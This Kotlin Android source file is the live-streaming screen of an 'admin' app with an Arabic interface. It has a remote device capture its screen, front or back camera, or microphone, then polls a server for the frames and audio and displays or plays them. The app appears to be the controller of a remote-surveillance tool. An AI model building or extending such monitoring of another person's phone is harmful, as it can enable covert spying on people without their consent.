package com.abuzahra.admin.ui.streaming

import android.content.Context
import android.content.Intent
import android.graphics.BitmapFactory
import android.media.MediaPlayer
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.view.View
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.abuzahra.admin.R
import com.abuzahra.admin.data.api.ApiClient
import com.abuzahra.admin.data.api.ApiService
import com.abuzahra.admin.data.model.Device
import com.abuzahra.admin.databinding.ActivityStreamingBinding
import com.abuzahra.admin.util.Preferences
import com.google.android.material.snackbar.Snackbar
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File

class StreamingActivity : AppCompatActivity() {

    private lateinit var binding: ActivityStreamingBinding
    private lateinit var device: Device
    private lateinit var api: ApiService

    // Server expects these exact stream_type values (see api_handlers.py jpeg_loop):
    //   "screen"      → cmd = screenshot
    //   "front_camera" → cmd = front_camera
    //   "back_camera"  → cmd = back_camera
    //   "audio"        → cmd = record_audio
    private var streamType = "screen"
    private var intervalMs = 2000L
    private var isStreaming = false
    private val handler = Handler(Looper.getMainLooper())
    private var streamRunnable: Runnable? = null

    // MediaPlayer used to play audio frames received from the device's
    // record_audio command. Released on stop / onDestroy.
    private var mediaPlayer: MediaPlayer? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityStreamingBinding.inflate(layoutInflater)
        setContentView(binding.root)

        device = intent.getSerializableExtra(EXTRA_DEVICE) as? Device ?: run {
            finish()
            return
        }

        val prefs = Preferences.getInstance(this)
        api = ApiClient.createWithToken(prefs.serverUrl, prefs.token ?: "")

        setupToolbar()
        setupViews()
    }

    private fun setupToolbar() {
        setSupportActionBar(binding.toolbar)
        supportActionBar?.title = "البث المباشر"
        supportActionBar?.setDisplayHomeAsUpEnabled(true)
        supportActionBar?.subtitle = device.name.ifEmpty { device.model }
        binding.toolbar.setNavigationOnClickListener { stopAndFinish() }
    }

    private fun setupViews() {
        // Stream type selector — 4 chips matching server stream_type values
        binding.chipScreen.isChecked = true
        binding.chipScreen.setOnClickListener {
            streamType = "screen"
            selectStreamChip(binding.chipScreen)
        }
        binding.chipFrontCamera.setOnClickListener {
            streamType = "front_camera"
            selectStreamChip(binding.chipFrontCamera)
        }
        binding.chipBackCamera.setOnClickListener {
            streamType = "back_camera"
            selectStreamChip(binding.chipBackCamera)
        }
        binding.chipAudio.setOnClickListener {
            streamType = "audio"
            selectStreamChip(binding.chipAudio)
        }

        // Quality selector (interval-based)
        binding.chipQualityHigh.setOnClickListener {
            intervalMs = 500L
            selectQualityChip(binding.chipQualityHigh)
        }
        binding.chipQualityMedium.setOnClickListener {
            intervalMs = 1000L
            selectQualityChip(binding.chipQualityMedium)
        }
        binding.chipQualityLow.setOnClickListener {
            intervalMs = 2000L
            selectQualityChip(binding.chipQualityLow)
        }
        binding.chipQualityMedium.isChecked = true

        // Start/Stop
        binding.btnStartStream.setOnClickListener {
            if (!isStreaming) {
                startStreaming()
            }
        }
        binding.btnStopStream.setOnClickListener {
            stopStreaming()
        }
        binding.btnStopStream.isEnabled = false
    }

    private fun selectStreamChip(selected: com.google.android.material.chip.Chip) {
        listOf(binding.chipScreen, binding.chipFrontCamera, binding.chipBackCamera, binding.chipAudio).forEach {
            it.isChecked = (it == selected)
        }
    }

    private fun selectQualityChip(selected: com.google.android.material.chip.Chip) {
        listOf(binding.chipQualityHigh, binding.chipQualityMedium, binding.chipQualityLow).forEach {
            it.isChecked = (it == selected)
        }
    }

    private fun startStreaming() {
        if (!device.isOnline) {
            Snackbar.make(binding.root, "الجهاز غير متصل", Snackbar.LENGTH_LONG).show()
            return
        }

        isStreaming = true
        binding.btnStartStream.isEnabled = false
        binding.btnStopStream.isEnabled = true
        binding.progressBar.visibility = View.VISIBLE
        binding.tvStatus.text = "جاري الاتصال..."

        lifecycleScope.launch {
            try {
                api.startJpegStream(device.id, streamType)

                withContext(Dispatchers.Main) {
                    binding.tvStatus.text = "بث مباشر - ${streamLabel(streamType)}"
                    binding.progressBar.visibility = View.GONE
                    startFramePolling()
                }
            } catch (e: Exception) {
                withContext(Dispatchers.Main) {
                    binding.tvStatus.text = "فشل بدء البث"
                    binding.progressBar.visibility = View.GONE
                    isStreaming = false
                    binding.btnStartStream.isEnabled = true
                    binding.btnStopStream.isEnabled = false
                }
            }
        }
    }

    private fun streamLabel(type: String): String = when (type) {
        "screen" -> "بث الشاشة"
        "front_camera" -> "الكاميرا الأمامية"
        "back_camera" -> "الكاميرا الخلفية"
        "audio" -> "بث الصوت"
        else -> type
    }

    private fun startFramePolling() {
        // For visual streams (screen / camera) the server stores frames
        // under "{device_id}:video". For audio streams the server stores
        // them under "{device_id}:audio" (added in Task 17-ADMIN). We
        // therefore pick the polling type accordingly.
        val pollType = if (streamType == "audio") "audio" else "video"

        streamRunnable = Runnable {
            if (!isStreaming) return@Runnable

            val currentRunnable = streamRunnable
            lifecycleScope.launch {
                try {
                    val response = api.getStreamFrame(device.id, pollType)

                    if (response.ok && response.data.isNotEmpty()) {
                        if (streamType == "audio") {
                            playAudioFrame(response.data)
                        } else {
                            val bytes = Base64.decode(response.data, Base64.DEFAULT)
                            val bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                            if (bitmap != null) {
                                withContext(Dispatchers.Main) {
                                    binding.imageView.setImageBitmap(bitmap)
                                    binding.tvFrameInfo.text = "${bitmap.width}x${bitmap.height}"
                                    binding.tvFrameInfo.visibility = View.VISIBLE
                                }
                            }
                        }
                    }
                } catch (_: Exception) {}

                if (isStreaming && currentRunnable != null) {
                    handler.postDelayed(currentRunnable, intervalMs)
                }
            }
        }
        handler.post(streamRunnable!!)
    }

    /**
     * Decodes the base64-encoded audio chunk and plays it via MediaPlayer.
     * The client app uploads audio files (m4a / mp4 / 3gp) via
     * /api/upload_base64 with file_type=audio, and the server caches them
     * under "{device_id}:audio" (see api_upload_base64).
     *
     * Each call replaces the previous MediaPlayer so we always play the
     * latest chunk. The chunk is written to a temp file because MediaPlayer
     * needs a file descriptor or URL — it cannot play from a raw byte array.
     */
    private fun playAudioFrame(base64Data: String) {
        try {
            val bytes = Base64.decode(base64Data, Base64.DEFAULT)
            val tempFile = File(cacheDir, "stream_audio_${System.currentTimeMillis()}.dat")
            tempFile.writeBytes(bytes)

            runOnUiThread {
                // Release the previous player before starting a new one.
                mediaPlayer?.release()
                mediaPlayer = MediaPlayer().apply {
                    setDataSource(tempFile.absolutePath)
                    setOnPreparedListener { start() }
                    setOnCompletionListener { /* discard */ }
                    setOnErrorListener { _, _, _ -> true }
                    prepareAsync()
                }
                binding.tvFrameInfo.text = "🎵 صوت — ${bytes.size / 1024} KB"
                binding.tvFrameInfo.visibility = View.VISIBLE
            }

            // Best-effort cleanup of old temp files (keep only the latest).
            cacheDir.listFiles { f -> f.name.startsWith("stream_audio_") }
                ?.sortedByDescending { it.lastModified() }
                ?.drop(1)
                ?.forEach { it.delete() }
        } catch (_: Exception) {
            // A malformed chunk shouldn't kill the polling loop.
        }
    }

    private fun stopStreaming() {
        isStreaming = false
        handler.removeCallbacksAndMessages(null)
        streamRunnable = null

        binding.btnStartStream.isEnabled = true
        binding.btnStopStream.isEnabled = false
        binding.tvStatus.text = "تم إيقاف البث"
        binding.progressBar.visibility = View.GONE

        // Release the audio player if we were streaming audio.
        try { mediaPlayer?.release() } catch (_: Exception) {}
        mediaPlayer = null

        lifecycleScope.launch {
            try {
                api.stopJpegStream(device.id)
            } catch (_: Exception) {}
        }
    }

    private fun stopAndFinish() {
        stopStreaming()
        finish()
    }

    override fun onDestroy() {
        super.onDestroy()
        stopStreaming()
    }

    companion object {
        const val EXTRA_DEVICE = "extra_device"

        fun newIntent(context: Context, device: Device): Intent {
            return Intent(context, StreamingActivity::class.java).apply {
                putExtra(EXTRA_DEVICE, device)
            }
        }
    }
}
